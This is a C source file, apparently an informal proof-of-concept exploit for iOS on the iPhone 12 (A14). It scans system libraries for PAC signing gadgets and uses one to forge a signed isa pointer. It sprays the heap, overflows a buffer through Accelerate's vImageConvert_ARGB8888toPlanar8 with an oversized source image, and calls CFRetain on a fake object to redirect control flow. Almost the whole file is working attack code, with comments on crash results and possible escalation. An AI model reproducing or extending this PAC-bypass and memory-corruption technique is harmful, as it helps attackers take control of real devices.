/* WELCOME TO THE SPAGHETTI CODE DEMONSTRATION! WORKS ONLY IN A14 iPHONE 12
 * poc will do these if i'm correct. let me know if im incorrect:
 * - find gadget
 * - sign fake obj isa
 * - heap overflow in accelerate framework to inject isa
 * - hijack cf w/ cfretain if possible
 * - idk how to escalate this further let me know if you know how to do it :D
 */


// Reduced all the names as tiny as possible cuz it's more readable than full name lol read down below
/// f = false, gg = gadget, of = overflow, sc = scratch,


#include <Accelerate/Accelerate.h>
#include <dlfcn.h>

//#define CT_PC_41 0x4141414141414141ULL
//#define CT_PC_42 0x4242424242424242ULL
//#define CT_PC_67 0x6767676767676767ULL
#define CT_PC 0x6767676767676767ULL

uint8_t scratch_buf[1024] __attribute__((aligned(16)));
uint8_t f_class_buf[2048] __attribute__((aligned(16)));

//static void sig_handler(int sig, siginfo_t *info, void *ctx) {
//    printf("\n crash: sig%d @ 0x%lx\n", sig, (long)info->si_addr);

//    if ((uint64_t)info->si_addr == CT_PC) {
//        printf("success?!??!?!??\n");
//    }
//    _exit(1);
//}
typedef enum {
    gg_non = 0,
    gg_x16_x17_pacda = 1, // 1 = 0xDAC10A30, 2 = 0xDAC100A0
    gg_x0_x1_pacda   = 2
} ggType;


uintptr_t f_gg_addr = 0;
ggType f_gg_type = gg_non;

void scan_lib(const char *path, const char *symbol) {
    if (f_gg_addr) return;
    void *handle = dlopen(path, RTLD_NOW);
    if (!handle) return;
    void *sym = dlsym(handle, symbol);
    if (!sym) return;
    uintptr_t base = (uintptr_t)sym & 0x0000007FFFFFFFFFULL;
    uint32_t *ptr = (uint32_t *)(base & ~0xFFF);
    
    printf("scan %s\n", path);

    for (int i = 0; i < (1024 * 1024) / 4; i++) {
        uint32_t op = ptr[i];
        ggType type = gg_non;
        
        if (op == 0xDAC10A30) type = gg_x16_x17_pacda;
        else if (op == 0xDAC100A0) type = gg_x0_x1_pacda;
        if (type != gg_non) {
            for (int k = 1; k <= 6; k++) {
                uint32_t next_op = ptr[i+k];
                if ((next_op & 0xE0000000) == 0x80000000) break;
                if ((next_op & 0xFFC00000) == 0xF9000000) break;
                if ((next_op & 0x7C000000) == 0x14000000) break;
                if (next_op == 0xd503237f || next_op == 0xd503233f) break;
                if (next_op == 0xd4200000) break;/// here for auth i guess i forgot
                if (next_op == 0xd65f03c0) {/// ret i recall
                    f_gg_addr = (uintptr_t)&ptr[i];
                    f_gg_type = type;
                    printf("found gg @ %p (Op: %08x)\n", &ptr[i], op);
                    printf("  ret: +%d inst.\n", k);
                    return;
                }
            }
        }
    }
}

uintptr_t call_gg(uintptr_t raw_ptr, uintptr_t salt) {
    uintptr_t signed_res = 0;
    uintptr_t safe_sc = (uintptr_t)scratch_buf;
    
    if (f_gg_type == gg_x16_x17_pacda) {
        __asm__ volatile(
            "mov x16, %1\n" "mov x17, %2\n" "mov x9, %3\n"
            "mov x0, %4\n" "mov x1, %4\n" "mov x2, %4\n" "mov x8, %4\n"
            "blr x9\n" "mov %0, x16\n"
            : "=r"(signed_res)
            : "r"(raw_ptr), "r"(salt), "r"(f_gg_addr), "r"(safe_sc)
            : "x16", "x17", "x9", "x30", "x0", "x1", "x2", "x8", "memory"
        );
    } else if (f_gg_type == gg_x0_x1_pacda) {
        __asm__ volatile(
            "mov x0, %1\n" "mov x1, %2\n" "mov x9, %3\n"
            "blr x9\n" "mov %0, x0\n"
            : "=r"(signed_res)
            : "r"(raw_ptr), "r"(salt), "r"(f_gg_addr)
            : "x0", "x1", "x9", "x30", "memory"
        );
    }
    return signed_res;
}

void stripe_payload(uint8_t* src_ptr, uint64_t payload) {
    uint8_t* p = (uint8_t*)&payload;
    for (int i = 0; i < 8; i++) src_ptr[i * 4 + 3] = p[i];
}

int main() {
//    struct sigaction sa = { .sa_sigaction = sig_handler, .sa_flags = SA_SIGINFO };
//    sigaction(SIGSEGV, &sa, NULL);
//    sigaction(SIGILL, &sa, NULL);
    printf("PaC ignore & vimage overflow\n");

    int W = 256, H = 256, oversized_h = 510;
    size_t src_len = (size_t)oversized_h * W * 4;
    size_t rowBytes_src = W * 4;
    vImage_Buffer src;

    
    scan_lib("/usr/lib/system/libsystem_platform.dylib", "_os_lock_handoff_lock");
    if (!f_gg_addr) scan_lib("/usr/lib/libobjc.A.dylib", "objc_msgSend");
    if (!f_gg_addr) scan_lib("/usr/lib/system/libdyld.dylib", "dlopen");
    if (!f_gg_addr) scan_lib("/usr/lib/system/libsystem_c.dylib", "printf");
    if (!f_gg_addr) scan_lib("/usr/lib/system/libdispatch.dylib", "dispatch_async");
    if (!f_gg_addr) {
        printf("failure\n");
        return 1;
    }

    
    
    
    
    
    // spray
    uint8_t* src_data = malloc(src_len);
    memset(src_data, 0xAA, src_len);

    // fill
    for (size_t extra_y = H; extra_y < oversized_h; extra_y++) {
        size_t row_start = extra_y * rowBytes_src;
        memset(src_data + row_start, 0xBB, rowBytes_src);
    }

    size_t dst_len = (size_t)H * W;
    size_t total_spray = 4 * dst_len + 4096;
    
    int num_sprays = 10;
    uint8_t** sprays = malloc(num_sprays * sizeof(uint8_t*));
    for (int s = 0; s < num_sprays; s++) {
        sprays[s] = malloc(total_spray);
        memset(sprays[s], 0x00, total_spray);
    }
    uint8_t* spray = sprays[0];
    uint8_t* dst_start = spray;
    vImage_Buffer dstA = { .data = dst_start, .height = H, .width = W, .rowBytes = W };
    vImage_Buffer dstR = { .data = dst_start + dst_len, .height = H, .width = W, .rowBytes = W };
    vImage_Buffer dstG = { .data = dst_start + 2 * dst_len, .height = H, .width = W, .rowBytes = W };
    vImage_Buffer dstB = { .data = dst_start + 3 * dst_len, .height = H, .width = W, .rowBytes = W };

    // fake obj
    uint8_t* guard_start = dst_start + 4 * dst_len;
    uint8_t* fake_leak_struct = guard_start;
    *(uint64_t*)fake_leak_struct = 0x67676767;// my signature number xD
    uint8_t* f_cmsample_struct = fake_leak_struct + 32;
    
    // vtable
    uint64_t* vtable_data = (uint64_t*)f_class_buf;
    for(int i=0; i<32; i++) vtable_data[i] = CT_PC;

    /*///////////////workflow
     - sign isa -> isa points to fake_class_buffer -> salt = address of f_cmsample_struct + 0x6ae1 (iphone 12 specific)
    */
    uintptr_t class_ptr_to_sign = (uintptr_t)f_class_buf;
    uintptr_t obj_addr = (uintptr_t)f_cmsample_struct;
    uintptr_t isa_salt = (obj_addr & 0x0000FFFFFFFFFFFFULL) | 0x6ae1000000000000ULL;
    uintptr_t signed_isa = call_gg(class_ptr_to_sign, isa_salt);
    printf("signed isa: 0x%lx\n", signed_isa);
    size_t of_pixel_index = H * W;
    uint64_t target_val_A = 0x1122334455667788;
    stripe_payload(src_data + (of_pixel_index * 4), target_val_A);
    stripe_payload(src_data + ((of_pixel_index + 32) * 4), signed_isa); /// 32 bytes -> overwrite w/isa

    printf("-trigger overflow\n");
    
    src.data = src_data;
    src.height = oversized_h;
    src.width = W;
    src.rowBytes = rowBytes_src;
    /// apple said it's working as expected so i don't think it's probleming here if apple's true
    vImageConvert_ARGB8888toPlanar8(&src, &dstA, &dstR, &dstG, &dstB, kvImageNoFlags); // no validation check here?

    // trigger
    printf("CFRetain crashed?\n");
    
    /*
     this will do these if i'm correct:
     - read corrupted isa - > auth - > read vtable - > jump 2 index if possible idk unsure
    */
    CFRetain((CFTypeRef)f_cmsample_struct); // Thread 1: EXC_BAD_ACCESS (code=1, address=0x40004141416440) or 67676767
    
    /*if crash, lldb this
        (lldb) bt,
        (lldb) frame select 0,
        (lldb) register read -> pc = 0x00000001934370ac  libobjc.A.dylib`objc_msgSend + 172
    */

    // cleaning my room
    for (int s = 0; s < num_sprays; s++) free(sprays[s]);
    free(sprays);
    free(src_data);
    return 0;
}
